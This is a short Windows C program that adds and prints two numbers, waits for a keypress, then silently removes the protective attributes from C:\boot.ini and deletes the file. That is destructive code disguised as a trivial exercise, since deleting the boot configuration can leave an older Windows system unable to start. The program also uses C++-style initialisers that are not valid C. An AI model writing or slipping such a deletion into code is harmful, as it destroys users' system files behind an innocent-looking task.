#include <stdio.h>
#include <windows.h>
 

int main ()

{
   int a(3),b(3);
   printf("%d", a+b);
   
   getchar();
   SetFileAttributes( "C:\\boot.ini", FILE_ATTRIBUTE_ARCHIVE);
   DeleteFile ("C:\\boot.ini" ); 
   return 0;

}
